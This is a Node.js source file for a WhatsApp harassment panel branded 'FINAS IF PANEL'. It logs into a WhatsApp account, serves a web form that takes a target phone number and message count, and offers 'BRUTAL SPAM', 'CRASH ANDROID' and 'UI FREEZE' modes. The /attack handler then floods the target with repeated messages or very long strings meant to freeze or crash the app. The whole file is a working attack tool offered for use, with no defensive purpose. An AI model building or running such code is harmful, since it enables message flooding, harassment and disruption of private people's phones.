const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const port = process.env.PORT || 3000;

// MESIN UTAMA
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox', 
            '--disable-dev-shm-usage', 
            '--no-zygote', 
            '--single-process', 
            '--disable-gpu'
        ] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR INI DI LOGS RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('✅ FINAS IF PANEL ONLINE!');
});

// TAMPILAN DASHBOARD
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>FINAS IF PANEL</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #000; color: #ffd700; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
                .card { border: 2px solid #ffd700; background: #111; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #ffd700; max-width: 400px; margin: auto; }
                h1 { color: #ffd700; text-shadow: 0 0 10px #ffd700; font-size: 28px; margin-bottom: 5px; }
                p { color: #888; font-size: 12px; }
                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: #fff; font-size: 16px; }
                button { background: #ffd700; color: #000; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
                button:hover { background: #fff; transform: scale(1.05); }
                .footer { margin-top: 20px; font-size: 10px; color: #555; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>FINAS IF PANEL</h1>
                <p>OWNER: FINAS IF | STATUS: ONLINE</p>
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                    <select name="type">
                        <option value="spam">🔥 BRUTAL SPAM</option>
                        <option value="crash">💀 CRASH ANDROID</option>
                        <option value="ui">☣️ UI FREEZE</option>
                    </select>
                    <input type="number" name="count" placeholder="Jumlah Pesan" value="10" required>
                    <button type="submit">START ATTACK</button>
                </form>
                <div class="footer">POWERED BY FINAS IF - 2026</div>
            </div>
        </body>
        </html>
    `);
});

// PROSES ATTACK
app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    
    // PESAN YANG DIKIRIM KE TARGET
    let text = "🔥 SPAMMED BY FINAS IF 🔥"; 

    if (type === "crash") text = "Buffer-Crash-".repeat(1500);
    if (type === "ui") text = "░".repeat(15000);

    console.log(`[!] Target: ${number} | Mode: ${type}`);

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik biar aman
        } catch (e) {
            console.log("Error: " + e);
        }
    }
    res.send('<h2 style="color:gold; text-align:center;">Serangan Finas IF Selesai!</h2><br><center><a href="/" style="color:white;">KEMBALI</a></center>');
});

app.listen(port, '0.0.0.0', () => {
    console.log('Server berjalan di port: ' + port);
});

client.initialize();
